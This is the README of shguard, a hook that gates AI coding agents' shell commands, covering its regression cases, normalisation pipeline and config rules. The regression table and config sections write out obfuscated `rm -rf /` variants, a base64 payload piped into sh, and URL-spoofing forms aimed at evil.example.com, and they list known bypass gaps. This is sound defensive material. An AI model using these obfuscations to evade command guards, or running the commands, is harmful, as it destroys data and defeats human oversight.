# shguard

A `PreToolUse` hook for AI coding agents that blocks dangerous shell commands
by interpreting what bash will actually execute — real tokenisation and
static normalisation, not regex matching against the command string.

## The regression table

Seven headline cases: one per published GuardFall class, two shguard
extensions, and a false-positive guard. This table is asserted verbatim by
`tests/guardfall.rs` — every row below is a passing test, not a claim.

| # | Class | Command | Expected |
|---|-------|---------|----------|
| 1 | A — quote removal | `r''m -rf /` | **Block** |
| 2 | A-ext — ANSI-C quoting | `$'\x72\x6d' -rf /` | **Block** |
| 3 | B — `$IFS` splitting | `rm$IFS-rf$IFS/` | **Block** |
| 4 | C — command substitution | `$(echo cm0gLXJmIC8= \| base64 -d)` | **Ask** |
| 5 | C-ext — variable indirection | `X=rm; $X -rf /` | **Block** |
| 6 | D — decode-fed pipe | `echo cm0gLXJmIC8= \| base64 -d \| sh` | **Block** |
| 7 | — false-positive guard | `git commit -m 'rm -rf /'` | **Allow** |

Rows 2 and 5 (ANSI-C quoting, variable indirection) are extensions shguard
covers beyond the published GuardFall catalog — see [Attribution](#attribution).

## Coverage

Three deterministic, test-backed coverage numbers, checked against the
actual test sources by `tests/coverage_metrics.rs` on every CI run: if
any number below drifts from what the tests actually contain, CI fails
rather than letting it go stale silently.

- **Bypass classes closed:** 7 (GuardFall's five published classes A-E,
  plus shguard's own two extensions, A-ext and C-ext; see the
  regression table above, which covers A-D directly, plus class E via
  the destructive-commands suite in `tests/guardfall.rs`, and
  [Attribution](#attribution)).
- **Regression test count:** 389 (384 pinned-decision literals across
  `tests/guardfall.rs`'s internally-discovered regression suite, plus 5
  externally-attributed cases in `tests/bypass_corpus.toml`). A lower
  bound, not an exact assertion count: some of `guardfall.rs`'s tests
  assert one literal per combinatorial loop iteration rather than one
  literal per case, so this undercounts the true number of individual
  assertions that actually run.
- **Benign corpus size:** 59 (realistic agent-workflow commands in
  `tests/benign_corpus.rs`, verified to `Allow` without friction).

This is a different axis from an LLM-based agent's self-reported
"automation rate" or similar metric: every number above is a passing,
deterministic test, evaluated the same way every time, not a judged or
sampled estimate. **What this does not claim:** exhaustive coverage of
every possible bypass technique, only of this specific, enumerated,
tested set. A technique not yet represented in these suites is not
proven safe merely because the numbers above look large.

## What it is

shguard is a `PreToolUse` hook for AI coding agents that blocks dangerous
shell commands by interpreting what bash will actually execute — real
tokenisation and static normalisation, not regex matching. It ships as a
single Rust binary with an agent-agnostic decision core, so the same
`analyze()` function can sit behind hook adapters for different coding
agents.

## Where shguard fits

shguard occupies one specific layer in a stack that can also include
host-side permission-request tooling and OS-level sandboxing. None of
these are alternatives to each other: each answers a different question,
and shguard is a floor those other tools sit above, not a replacement for
either.

```
+-------------------------------------------------------------+
| Permission-request tooling (ccgate, Claude Code Auto Mode)  |
| "should this request be approved right now?"                |
+-------------------------------------------------------------+
| shguard (PreToolUse hook, this project)                     |
| "should this exact command shape ever run, evaluated the    |
|  same way every time?"                                      |
+-------------------------------------------------------------+
| OS sandbox (Seatbelt, bubblewrap)                           |
| "what can an ALLOWED, running process actually touch        |
| (filesystem, network), regardless of shguard's decision?"   |
+-------------------------------------------------------------+
```

**shguard vs. permission-request tooling.** shguard is deterministic: the
same command shape gets the same decision every time, with no context or
conversation history involved. ccgate, in contrast, delegates each
permission prompt to an LLM that judges whether this specific request, in
this specific context, should be approved right now, and Claude Code's
own permission modes decide which categories of requests need a prompt
at all; either can layer on top of shguard instead of duplicating it.
ccgate's own writeup states the deterministic-hard-limit boundary
directly: "ccgate is not a security boundary. Hard limits
(`permissions.deny`, sandboxing, managed settings) should still do that
job." ([source](https://dev.to/tak848/ccgate-delegate-claude-code-codex-cli-permission-prompts-to-an-llm-274c)).
shguard is built to be that kind of deterministic hard limit.

**shguard vs. sandboxes.** shguard decides whether a command executes at
all; a sandbox constrains what an already-executing process can touch
once it's running, independent of shguard's decision. These are
complementary, not overlapping: a sandboxed process can still run a
command shguard would have blocked if shguard isn't in the loop, and
shguard blocking a command says nothing about what an *allowed* command
could still do once it starts running. Run both: shguard as the
deterministic gate on which commands start, a sandbox as the boundary on
what a started process can reach.

## How it works: a four-stage pipeline

1. **Parse** — a thin adapter over [`brush-parser`](https://crates.io/crates/brush-parser)
   converts the raw command string into shguard's own AST, so the external
   parser crate never leaks past the parser boundary.
2. **Normalise** — static folding on the AST: quote removal (`r''m` → `rm`),
   ANSI-C decoding (`$'\x72\x6d'` → `rm`), `$IFS` splitting, and tilde/brace
   expansion. Only what is statically determinable is folded — no
   environment lookups, no filesystem globbing, no execution.
3. **Danger check** — an exact match of the resolved argv against
   `rules/blocklist.toml`: does the token at this position match exactly.
4. **Structural gate** — routes constructs whose value can't be statically
   resolved by their *structure* rather than by guessing their value:
   command-position substitutions (`$(...)`, bare `$VAR`) go to **Ask**;
   decode-fed interpreter pipes (`base64 -d | sh`) go to **Block**.

## Install

```bash
cargo install shguard
```

Or with Homebrew:

```bash
brew install tsukasaI/shguard/shguard
```

Or with Nix:

```bash
nix run github:tsukasaI/shguard
```

Or download a prebuilt binary from the [Releases page](https://github.com/tsukasaI/shguard/releases), no Rust toolchain required. Each release publishes `shguard-<target>` for `aarch64-apple-darwin`, `x86_64-apple-darwin`, `aarch64-unknown-linux-gnu`, and `x86_64-unknown-linux-gnu`, plus a `SHA256SUMS` file to verify the download:

```bash
curl -fLO https://github.com/tsukasaI/shguard/releases/latest/download/shguard-x86_64-unknown-linux-gnu
curl -fLO https://github.com/tsukasaI/shguard/releases/latest/download/SHA256SUMS
sha256sum -c SHA256SUMS --ignore-missing
chmod +x shguard-x86_64-unknown-linux-gnu
sudo mv shguard-x86_64-unknown-linux-gnu /usr/local/bin/shguard
```

(On macOS, stock `sha256sum` isn't installed; use `shasum -a 256 -c SHA256SUMS --ignore-missing` instead.)

### Claude Code registration

Add to `settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "shguard"
          }
        ]
      }
    ]
  }
}
```

### Dry-run: `shguard check`

To see what shguard would decide for a command without wiring up a hook,
run it directly:

```console
$ shguard check 'rm -rf /'
Decision: Block
Reason: matches blocklist rule "rm-recursive-force-dangerous-target": rm with recursive+force flags against a root-level, home, device, or find-placeholder target
Matched rule: rm-recursive-force-dangerous-target
$ echo $?
1
```

`shguard check <command>` runs the command through the same evaluation
path (`analyze_with_policy`) a real PreToolUse hook invocation uses,
including any `~/.config/shguard/config.toml` policy, so its output always
matches what the hook itself would decide. It exits `1` on Block (useful
for a CI step asserting a command is rejected), `0` on Allow or Ask, and
`2` on a usage error (missing/extra arguments, a non-UTF-8 command) or if
the config itself fails to load. Add `--json` for machine-readable output
(keys always present, `null` where a field doesn't apply — never omitted):

```console
$ shguard check 'echo hello' --json
{"command":"echo hello","decision":"Allow","deny_message":null,"matched_rule_id":null,"reason":null}
```

A config-load failure under `--json` still emits `{"error": "..."}` on
stdout. Usage errors (missing/extra arguments, a non-UTF-8 command) are
always printed as human-readable text on stderr regardless of `--json` —
check the exit code (`2`) first if you're scripting against this.

## Configuration

By default shguard needs no setup — the embedded blocklist above is all
that runs. To declare your own per-command policy, create
`~/.config/shguard/config.toml` (or set `SHGUARD_CONFIG` to point at a
different file).

### Scaffolding a starter config: `shguard init`

```console
$ shguard init
shguard init: wrote /home/you/.config/shguard/config.toml
```

Writes a starter config to the same path shguard would otherwise look
for, with a few commented-out example entries plus the full embedded
blocklist re-emitted as a commented-out reference appendix, so the
built-in rule set is discoverable and auditable without reading source.
Every line in the generated file is a comment: config layers additively
on top of the embedded blocklist (there's no mechanism to edit or disable
a built-in rule by id), so copying a reference entry to make it active
needs a fresh, non-colliding `id` first. Refuses to overwrite an existing
file; pass `--force` to overwrite it anyway.

```toml
[[ask]]
id = "user-ask-gh"
reason = "confirm every gh invocation before it runs"
command = "gh"

[[deny]]
id = "user-deny-scary-tool"
reason = "never run this"
command = "scary-tool"

[[allow]]
id = "user-allow-rm"
reason = "trust me"
command = "rm"
```

Each entry needs a unique `id` (the audit-trail id surfaced in the
decision reason) and a `reason`, plus one of `command`/`command_prefix` —
optionally narrowed further with `required_flags`/`targets`, the same
matcher shape `rules/blocklist.toml` itself uses (see that file's own
schema comments).

### Protecting your own paths from bare redirection

`[[ask]]`/`[[deny]]`/`[[allow]]` each match a *command*'s argv. A separate
`[[redirect]]` array matches the *target* of a bare shell output/append
redirection (`>`, `>>`) instead — the same mechanism backing the embedded
blocklist's own device/`/etc/passwd`/`/etc/shadow` protection and the
config-directory self-protection rules (issue #100: a path unreachable via
a write-capable command must also be unreachable via `>`/`>>`, since the
write mechanism shouldn't change the outcome):

```toml
[[redirect]]
id = "user-forbid-redirect-to-secrets"
reason = "forbid redirecting into ~/secrets"
targets = [{ normalized_prefix = "~/secrets/" }]
```

`decision` must be `"block"` (the default — omit the field entirely for
the common case). Unlike a command rule, a user-declared redirect entry
cannot be `"ask"`; `decision = "ask"` is rejected at config load time (the
whole config fails closed) rather than silently accepted and only
sometimes honored. This began as a guard against a downgrade race — the
redirect check used to run first-match and short-circuit every other check
— and remains as a conservative posture now that the check folds
worst-wins across rules, targets, and both target-resolution channels. `targets` is required and
non-empty, using the same `{ exact = … }`/`{ prefix = … }`/
`{ normalized = … }`/`{ normalized_prefix = … }` matcher shapes as a
command rule's own `targets`/`except_targets`. User-declared redirect
rules are purely additive: they're checked after every embedded redirect
rule, so a user rule can only ever add new protected targets — combined
with the block-only restriction above, it can never weaken or shadow a
built-in one.

### Composing conditions: AND/OR without a separate syntax

`required_flags`/`targets` already compose as a real boolean expression,
not a bare AND across opaque fields — no separate `any_of`/`all_of`
grouping syntax is needed for the common compound shapes:

- **Within one `required_flags` entry, `|` is OR.** `"f|--force"` means
  "the short spelling OR the long spelling", so a rule can't be dodged by
  swapping one flag spelling for the other.
- **Across `required_flags` entries, and against `required_tokens`, it's
  AND.** Every entry in the list must be satisfied — `required_tokens`
  specifically as an ordered leading-positional match, not mere presence
  anywhere in argv, but still a conjunction with everything else.
- **Across `targets` alternatives, it's OR.** The rule fires if *any* argv
  token matches *any* one of the listed targets — so `required_flags`
  (AND-of-ORs) combined with `targets` (OR) already expresses "flag AND
  (target A OR target B)":

  ```toml
  [[deny]]
  id = "user-deny-protected-branch-force-push"
  reason = "force push to a protected branch"
  command = "git push"
  required_flags = ["f|--force"]
  targets = [{ exact = "main" }, { exact = "master" }]
  ```

  `git push --force origin main` and `git push --force origin master` are
  both denied; `git push --force origin feature` and a plain `git push
  origin main` (no `--force`) are both untouched by this rule.
- **Across separate `[[deny]]`/`[[ask]]`/`[[allow]]` entries, it's OR.**
  The rule set as a whole is a disjunction — "any of N independent
  condition-sets" is N separate entries, not a single rule needing its
  own top-level OR primitive.

Two caveats on the example above, not fixed by this section — narrowing
the gap, not eliminating it, the same posture `except_targets`' own docs
below take:

- The embedded blocklist already denies **every** `git push --force`
  regardless of branch (`rules/blocklist.toml`'s `git-push-force` rule) —
  the example above illustrates the composition syntax, it is not itself
  what protects `main`/`master` from a force push; that protection already
  exists unconditionally.
- `{ exact = "main" }` matches the branch name as a bare positional
  argument; it does not parse a git refspec, so `git push --force origin
  main:main`, `git push --force origin HEAD:main`, or `git push --force
  origin refs/heads/main` are not recognised as targeting `main` by this
  matcher shape. Widening this to cover refspec forms is a separate,
  git-specific concern, not part of `targets`' general boolean composition.

The one shape genuinely not expressible today is AND *between* two
`targets` alternatives within a single rule ("some token matches X AND some
other token matches Y") — `targets` only ever ORs. No rule in the embedded
blocklist needs that shape; if one arises, it's a scoped follow-up, not
something to design speculatively ahead of a concrete need.

### Declaring pipeline-shape rules

`[[ask]]`/`[[deny]]`/`[[allow]]` each match one simple command. A separate
`[[pipeline]]` array matches the *shape of a whole pipeline* instead — an
earlier stage's command name against `sources`, the final stage's command
name against `sinks` — the same mechanism backing the embedded blocklist's
own `curl | sh`/`wget | sh` installer-pipe protection (`rules/
blocklist.toml`'s `curl-wget-pipe-to-shell` rule; distinct from the
regression table's row 6 decode-fed-pipe case, which is a separate,
hardcoded structural-gate check, not a `[[pipeline]]` rule). Declaring your
own lets you forbid additional pipeline shapes (e.g. a team that also
wants to catch `curl ... | python3`) without a code change:

```toml
[[pipeline]]
id = "user-forbid-curl-python"
reason = "forbid piping a downloaded script into python3"
decision = "block"
sources = ["curl", "wget"]
sinks = ["python3"]
```

`decision` is `"block"` (default) or `"ask"` — there is no `"allow"` value
for a pipeline entry, unlike `command`/`command_prefix` rules. `sources`/
`sinks` are exact command names (no `command_prefix`-style prefix
matching): each pipeline stage is resolved to its own command name the
same way a `command`-matched rule resolves argv[0] — basename, with any
transparent wrapper (`env`, `nohup`, `timeout`, ...) skipped — so
`/bin/sh` or `env sh` as a sink is caught exactly like a bare `sh` would
be. The rule matches when *any* earlier stage's resolved name is in
`sources` and the *final* stage's resolved name is in `sinks`.

User-declared pipeline rules are purely additive. Within the `[[pipeline]]`
mechanism itself, they're checked after every embedded pipeline rule
(`rules/blocklist.toml`'s own `[[pipeline]]` entries), so a user rule can
never shadow a built-in one even if it declares the exact same
`sources`/`sinks` with a weaker `decision`. Against the structural gate's
separate, hardcoded decode-fed-pipe detection (the regression table's row
6), the guarantee comes from a different mechanism, not check order: the
gate folds the *worst* verdict across every check it runs, so a weaker
verdict from a user pipeline rule can never suppress a Block the
decode-fed-pipe detection independently produces for the same command.

### Actionable guidance with `deny_message`

`reason` explains *why* a decision was made — for a human reading the
audit trail. An optional `deny_message` on a `[[deny]]`/`[[ask]]` entry is
for a different audience: the *agent* that issued the command, as
actionable guidance on what to do instead of retrying the same command:

```toml
[[deny]]
id = "user-deny-force-push"
reason = "git push --force overwrites remote history"
command = "git push"
required_flags = ["f|--force"]
deny_message = "use `git push --force-with-lease` instead"
```

The two fields travel separately: `reason` stays in
`permissionDecisionReason` as before; `deny_message`, when a rule declares
one, is additionally emitted as `hookSpecificOutput.additionalContext` —
the field Claude Code's `PreToolUse` hook contract shows to the agent
alongside the decision, distinct from the reason a human reads in logs. A
rule with no `deny_message` behaves exactly as before — the field is
entirely omitted from the output, not emitted empty. `deny_message` is
only meaningful on `[[deny]]`/`[[ask]]` entries (which can produce a
non-Allow verdict); declaring it on an `[[allow]]` entry, or an embedded
allowlist `[[entry]]`, is a load-time error, the same "catch dead
configuration early" posture other fields in this schema already take.

**Known limitation (issue #202):** `deny_message` is only guaranteed to
surface for a *definite* rule match. A handful of partial-match floors
(the except-target floor, the directory-equals-tilde floor and its
siblings) and a nested verdict re-wrap (`bash -c 'blocked-cmd'` recursing
into the inner command) don't yet thread a matched rule's `deny_message`
through to their own verdict — the rule's `reason` still surfaces
correctly on those paths, only `deny_message` is currently silent there.

### Excepting specific targets

`deny`/`ask` entries can also carry `except_targets`, the opposite of
`targets`: the rule matches unless the target matches one of these shapes.
This expresses "gate this command except for a known-safe destination" —
something `targets` alone (matches *only when* a target is hit) and
`allow` layering (can only downgrade a structural Ask, never a config-level
deny/ask — see [Precedence](#precedence-deny--ask--allow) below) can't do.

```toml
[[ask]]
id = "curl-non-localhost"
reason = "confirm before curl makes an outbound request to a non-localhost target"
command = "curl"
except_targets = [
  { exact = "http://localhost" }, { prefix = "http://localhost:" }, { prefix = "http://localhost/" },
  { exact = "https://localhost" }, { prefix = "https://localhost:" }, { prefix = "https://localhost/" },
  { exact = "http://127.0.0.1" }, { prefix = "http://127.0.0.1:" }, { prefix = "http://127.0.0.1/" },
  { exact = "https://127.0.0.1" }, { prefix = "https://127.0.0.1:" }, { prefix = "https://127.0.0.1/" },
  { exact = "http://[::1]" }, { prefix = "http://[::1]:" }, { prefix = "http://[::1]/" },
  { exact = "https://[::1]" }, { prefix = "https://[::1]:" }, { prefix = "https://[::1]/" },
]

[[ask]]
id = "rsync-remote-spec"
reason = "confirm before rsync touches a remote host"
command = "rsync"
except_targets = [
  { prefix = "/" },
  { prefix = "./" },
  { prefix = "../" },
  { prefix = "~" },
  { exact = "." },
]
```

The rule fires unless *every* candidate target token matches an
`except_targets` alternative — a mix of a local and a remote `rsync`
argument still asks, since the remote one is never excepted. A token whose
value can't be statically resolved (a `$VAR`, a substitution) is never
treated as excepted either, so a command with an unresolvable argument
still asks rather than silently passing through. A target passed as a
`--flag=value` token's attached value (e.g. `--url=`) is still checked
against `except_targets`, not silently skipped just because the token
itself starts with `-`.

Note the curl example's `{ exact = … }` / `…:`/`…/`-suffixed alternatives,
not a bare `{ prefix = "http://localhost" }`: `targets`/`except_targets`
match on a plain string prefix, with no URL-authority parsing, so an
unanchored prefix would also match `http://localhost.evil.example.com` (a
different host that merely starts with the same characters) or
`http://localhost@evil.example.com` (`localhost` as URL userinfo, not the
host). Anchoring each alternative at a port/path boundary or an exact match
closes both; it's still not a full URL parse (a colon-anchored prefix
still matches userinfo-with-password forms like
`http://localhost:pw@evil.example.com`, and query strings aren't handled
either), so treat this as narrowing the gap, not eliminating it.

### Opt-in real URL parsing: `url_host`

The gaps above are all instances of one root cause: `exact`/`prefix`
compare raw string text, not a parsed URL's *host* component. For a rule
author who wants that gap fully closed rather than narrowed, `targets`/
`except_targets` accept a fifth, opt-in shape — `{ url_host = "…" }`
(issue #102) — that parses the candidate as a real URL (via the
[`url`](https://crates.io/crates/url) crate, the same WHATWG-standard
parser browsers use — see `docs/adr/0002-url-crate.md`) and compares its
actual host, not any string prefix of the raw text:

```toml
[[ask]]
id = "curl-non-localhost"
reason = "confirm before curl makes an outbound request to a non-localhost target"
command = "curl"
except_targets = [{ url_host = "localhost" }]
```

With this rule, `curl http://localhost:pw@evil.example.com` correctly
**asks** — the real host is `evil.example.com`, not `localhost` — closing
the userinfo-spoofing gap the string-prefix example above discloses as
unclosed. `curl http://localhost:8080/api` still correctly **allows**.

This is opt-in and stays that way — the default `exact`/`prefix` matching
above is unchanged for any config that doesn't use `url_host`. A few
things to know before reaching for it:

- **It must REPLACE the `exact`/`prefix` entries for the same host, not
  sit alongside them.** `except_targets` alternatives are OR'd — if a rule
  keeps `{ prefix = "http://localhost:" }` *and* adds
  `{ url_host = "localhost" }`, the userinfo-spoofed URL still matches the
  retained prefix entry and the rule gains no protection at all. Migrating
  to `url_host` means removing the string-based alternatives for that
  host, not adding to them. Run `shguard --check-config` after editing
  `except_targets` — it flags any rule whose `except_targets` mixes a
  `url_host` entry with an `exact`/`prefix` entry (exits `1` if it finds
  one, `0` if clean, `2` if the config itself fails to load) without
  needing to prove the two entries target the same host; the PreToolUse
  hook itself can't safely warn about this on its own, since it re-parses
  config on every single command.
- **An unparseable candidate fails closed**: if a candidate target token
  doesn't parse as a URL at all, `url_host` never matches it — the
  exception doesn't apply and the rule still fires. There is no fallback
  to string matching for that token.
- **A scheme-less token doesn't except.** `localhost:8080` (no `http://`)
  parses with `localhost` as the *scheme*, not the host, so a
  `url_host = "localhost"` rule doesn't except it — it asks, same as
  today's default matching would for that shape. Resist the urge to
  "fix" this with `{ prefix = "localhost:" }` alongside it: that
  reopens the exact userinfo-spoof shape this feature exists to close
  (`localhost:pw@evil.example.com` matches that prefix too).
- **IPv6 hosts need brackets in the config value**: `{ url_host = "[::1]"
  }`, not `{ url_host = "::1" }` — the bare form is rejected as an invalid
  domain name at load time. This matches how the host appears inside a
  URL's own authority component (`http://[::1]:8080/`).
- **Known residual risk, narrowing not eliminating** (same posture as the
  string-matching gaps above): the `url` crate's WHATWG parsing can
  diverge from what `curl`/other tools actually do with the same text in
  rare cases (backslash handling in particular) — a candidate containing
  a backslash is rejected outright, before parsing, specifically to close
  that known differential. See `docs/adr/0002-url-crate.md`'s "Known
  residual risk" section for the full reasoning.
- `url_host` also works in `targets` (not just `except_targets`), with
  the same real-host-comparison semantics.
- **It's scheme-blind.** `url_host = "localhost"` excepts `http://`,
  `https://`, `ws://`, `wss://`, and `ftp://` targets alike — any scheme
  where the URL Standard puts a host in the authority component — not
  just plain HTTP(S). A rule scoped to one specific scheme still needs an
  additional check for that (e.g. a `required_tokens`/prefix constraint
  on the scheme itself).

`except_targets` also can't see a target glued directly onto a
single-dash flag with no `=` separator — curl's `-xhttp://evil.example.com`
short proxy-flag syntax, for instance. That shape is indistinguishable
from an ordinary combined short-flag cluster (`-sSL`) by shape alone, so
it's never recognised as a candidate at all by default; `curl
http://localhost -xhttp://evil.example.com` would be wrongly excepted by
the config above. Declare the flag via `attached_value_flags` to opt a
rule into recognising it:

```toml
[[ask]]
id = "curl-non-localhost"
reason = "confirm before curl makes an outbound request to a non-localhost target"
command = "curl"
attached_value_flags = ["x"]
except_targets = [
  { exact = "http://localhost" }, { prefix = "http://localhost:" }, { prefix = "http://localhost/" },
  # ... other localhost/127.0.0.1/[::1] variants, as above
]
```

With `x` declared, `-xhttp://evil.example.com`'s glued value becomes a
candidate too, so it's checked against `except_targets` like any other
target — the rule above now correctly asks instead of being wrongly
suppressed. This is opt-in and per-flag: the declared letter is
recognised anywhere in a short-flag cluster via a left-to-right scan
matching getopt's own parsing (`-sxURL` is `-s` plus `-x URL`, so `x`'s
glued value is still found even though it isn't the cluster's leading
character), and only takes effect on a rule that also declares
`except_targets` with no `targets` list — `shguard` rejects the field at
load time otherwise, since it would silently do nothing. Because the
scan has no notion of which earlier characters are themselves
value-taking, it can occasionally split inside an EARLIER flag's own
glued value instead of a genuine flag position (`-oxyz` with `x`
declared but `o` actually the value-taking flag yields `"yz"`, not
`"xyz"`) — declaring the earlier flag too, in this same rule's
`value_flags`, closes that specific case, but for a flag this rule has
no declared knowledge of, the mis-split can occasionally manufacture a
candidate that happens to match an `except_targets` alternative and
newly *suppress* a rule that would otherwise fire, even though the
actual dangerous target elsewhere in the same command is untouched.
Declaring a flag here can also newly suppress a match more directly, not
just via a mis-split — e.g. `curl -xhttp://localhost:8080` alone (no
other target) is suppressed once `x` is declared, since the glued value
becomes the sole candidate and it matches the localhost except; treat
each declared flag as a per-rule trust decision with the same weight as
an `except_targets` entry itself, and expect a higher false-ask rate too
— a declared letter appearing incidentally inside an unrelated token's
text also yields a junk candidate, which is fail-closed-direction once
the candidate set would otherwise already be non-empty, but is the same
suppression risk as above if the set would otherwise have been empty.
For a command using this idiom without declaring the flag here, guard it
with `required_flags`/a separate `deny` entry instead of relying
on `except_targets` alone.

By default, every non-flag/`--flag=value`-value token in the command's tail
counts as a candidate — including a value-taking flag's own value. That
over-counts for commands like the curl/rsync examples above: `curl -s -o
/dev/null -w "%{http_code}" http://localhost:8787/` asks even though the
real target is localhost, because `/dev/null` (the `-o` output path) and
`%{http_code}` (the `-w` format string) are also treated as unexcepted
candidates. `value_flags` narrows this: declare which flags take a value
(without the leading `-`/`--` — a single letter is a short flag, anything
longer a long-option name) and that value — separated or `--name=value`
attached — is excluded from the candidate set entirely, never checked
against `except_targets` one way or the other:

```toml
[[ask]]
id = "curl-non-localhost"
reason = "confirm before curl makes an outbound request to a non-localhost target"
command = "curl"
value_flags = ["o", "w", "m"]
except_targets = [
  { exact = "http://localhost" }, { prefix = "http://localhost:" }, { prefix = "http://localhost/" },
]

[[ask]]
id = "rsync-remote-spec"
reason = "confirm before rsync touches a remote host"
command = "rsync"
value_flags = ["exclude"]
except_targets = [
  { prefix = "/" },
  { prefix = "./" },
  { prefix = "../" },
  { prefix = "~" },
  { exact = "." },
]
```

`value_flags` only has an effect alongside a non-empty `except_targets`
and an empty `targets`, OR (issue #146) alongside a non-empty
`required_flags`/`required_tokens` and an empty `targets` — declaring it
anywhere else is a load-time error, since the field would otherwise
silently do nothing. In the `required_flags`/`required_tokens` shape, it
narrows a different floor: whether an unresolvable word in the command's
tail (`$VAR`, `$(...)`) *could plausibly be* one of the rule's required
flags/tokens. Without declaring the flag that precedes it as a
`value_flags` entry, a value-taking flag's own value gets mistaken for a
free token that might be the dangerous flag itself — `git commit -m
"$(cat <<'EOF' ... EOF)"` (a heredoc commit message) would otherwise ask
for confirmation, because the message text looks exactly as unresolvable
as a hidden `--no-verify` would:

```toml
[[command]]
id = "git-commit-no-verify-short"
reason = "git commit -n/--no-verify skips pre-commit and commit-msg hooks"
command = "git"
required_tokens = ["commit"]
required_flags = ["n|--no-verify"]
value_flags = ["m", "message"]
```

Declaring a flag here is a trust decision with the same weight as an
`except_targets` entry itself: only declare a flag whose value can never
itself be, or point at, the thing the rule guards against — misdeclaring
one is as much a bypass as a wrong `except_targets` pattern would be. In
particular, don't declare an *optional*-argument flag (one that may or may
not take a value depending on invocation, e.g. GNU `--color[=WHEN]`) —
when such a flag appears without its value, the *next* token is an
unrelated positional, and `value_flags` would wrongly consume it as if it
were that flag's value. A short flag is only recognised as its own
standalone token (`-o`, never glued into a cluster like `-so`), and
everything after a bare `--` end-of-options terminator is exempt from
`value_flags` matching entirely (it's an ordinary positional by shell
convention from that point on, even if its text happens to match a
declared flag's name).

**Subcommand-dispatched commands need one more caveat.** A flag's arity can
depend on which subcommand it's attached to — git's `-m` takes a value on
`commit`/`merge` but is a boolean flag on `rebase` (`--merge`) and `am`
(`--message-id`). Only declare `value_flags` on a rule that pins a single
subcommand via `required_tokens` (as the example above does with
`["commit"]`); declaring it on a rule with no `required_tokens` at all —
one meant to span every subcommand of a dispatched command — can turn a
real flag into an accidentally-swallowed value on the subcommands where
your declared flag doesn't actually take one.

Per-command policy can be scoped to a subcommand sequence: a multi-word
`command` value matches a leading sequence of positional words, e.g.
`command = "gh repo delete"` asks only before `gh repo delete ...`, while
`gh pr view` (and bare `gh`) fall through to their default `Allow` since no
rule fires for them — no separate `allow` entry needed. Under the hood this
desugars to a single-word `command` plus `required_tokens` (`command =
"gh"`, `required_tokens = ["repo", "delete"]`), so it inherits that
shape's own gap: a resolved flag *value* occupying one of the
subcommand's positional slots can defeat the match the same way it can
defeat a hand-written `required_tokens` rule — see the
`value_flags`/subcommand-arity discussion above.

### Precedence: deny > ask > allow

Evaluation is fixed, regardless of which array a rule came from: a `deny`
match always wins; failing that, an `ask` match always wins over an
`allow` match for the same command. A `deny`/`ask` entry can only ever
*raise* what would otherwise be `Allow` — it can never be silently
overridden by a broader `allow` entry elsewhere in the file. This holds
unconditionally for `[[ask]]`-table entries and for `[[deny]]` entries
using the default `decision = "block"`; a `[[deny]]` entry with
`decision = "ask"` instead produces a structural `Ask` — the same kind an
embedded ask-decision blocklist rule would — which a narrower `[[allow]]`
entry in the same config **can** downgrade. An `allow` entry can only ever
*downgrade* an `Ask` that shguard's own structural analysis or an
ask-decision rule produced (an unresolvable construct, or a `[[deny]]`
entry with `decision = "ask"`, for instance) — it can **never** downgrade a
`Block`, from the embedded blocklist or from your own `deny` entries. This
mirrors Claude Code's own `permissions.{deny,ask,allow}` model.

### Keeping secrets scanners runnable

Secrets-scanning tools (secretlint, detect-secrets, gitleaks, trufflehog)
routinely read files that look like secrets as their normal job. A broad
`[[deny]]` rule protecting those same paths has no allow-side rescue for
them by design: per the precedence rule above, `[[ask]]`-table entries and
block-decision `[[deny]]` entries can never be downgraded by an
`[[allow]]` entry. The fix is to shape the deny rule itself, not to look
for an escape hatch:

- **Prefer an exact `command` (or the multi-word sugar) over
  `command_prefix`.** `command_prefix` matches on `starts_with`, so
  `command_prefix = "git"` also matches `gitleaks` — a broad prefix rule
  meant for `git` silently swallows an unrelated tool that happens to
  share the prefix.
- **If the deny genuinely needs to be broad, set `decision = "ask"` on it
  and add a narrow `[[allow]]` pinning the scanner's leading subcommand
  words.** A `[[deny]]` entry with `decision = "ask"` produces a
  structural `Ask`, which — unlike a block-decision deny — a matching
  `[[allow]]` entry can downgrade back to `Allow`. This is the one
  allow-side rescue the precedence model permits, and it's the correct
  tool for this case. As with any multi-word `command` sugar (see above),
  the allow matches the pinned leading words plus *any* trailing flags or
  extra positionals — it is not an exact-invocation match, so keep it as
  tight as the leading words allow.
- For target-shaped carve-outs (e.g. exempting one path rather than one
  command), see `except_targets` instead.

### Escalation floor

Any command wrapped by `sudo`, `doas`, `su`, `pkexec`, or `run0` — anywhere
in its transparent-wrapper chain, not just as the first word (`env sudo ls`
is caught the same as `sudo ls`) — is gated even on a blocklist miss:
`sudo whoami` asks for confirmation by default, while `sudo rm -rf /` still
blocks via the ordinary `rm` rule exactly as before. Set the top-level
`escalation_floor` key to raise that default:

```toml
escalation_floor = "deny"  # default is "ask"; "allow" is rejected at load
```

`"allow"` is rejected when the config is loaded — there is no way to turn
the floor off entirely, only to tighten it. A `[[deny]]`/`[[ask]]` entry
naming one of the five commands directly (`command = "doas"`) is also
reachable, independent of `escalation_floor`, the same as any other rule.

### Structured decision-output logging

Off by default. shguard's own decision output today is only the hook
response JSON on stdout (or `shguard check`'s printed/`--json` output) —
nothing persists across invocations. Set the top-level `decision_log_path`
key to append one JSONL line per evaluated command to a file:

```toml
decision_log_path = "/home/user/.local/state/shguard/decisions.jsonl"
```

Each line is a JSON object (keys serialize alphabetically, matching
`shguard check --json`'s own key order from #109) — captured verbatim
against the built binary:

```json
{"command":"rm -rf /","decision":"Block","deny_message":null,"matched_rule_id":"rm-recursive-force-dangerous-target","normalized_argv":["rm","-rf","/"],"reason":"matches blocklist rule \"rm-recursive-force-dangerous-target\": rm with recursive+force flags against a root-level, home, device, or find-placeholder target"}
```

`matched_rule_id` is `null` for an `Allow`, an `Ask`/`Block` decided
structurally rather than by an exact rule match, or an `Allow` reached by
an allowlist downgrade. The file is opened in append mode (created if
missing with `0600` permissions — it records every evaluated command
verbatim, which routinely contains inline secrets — never truncated), and
a write failure — a missing parent directory, a full disk — is silently
dropped rather than affecting the returned decision: logging is a
best-effort observability side channel, not part of the decision
contract. Both the real PreToolUse hook and `shguard check` write through
the same code path, so a logged line never disagrees with what either
caller actually saw — for `shguard check` and a direct library caller,
this includes a fail-closed `Ask` from `analyze_with_policy`'s own
bounded-evaluation watchdog.

The log write itself happens *outside* that watchdog's wall-clock bound
(a blocking write inside it would risk corrupting an already-computed
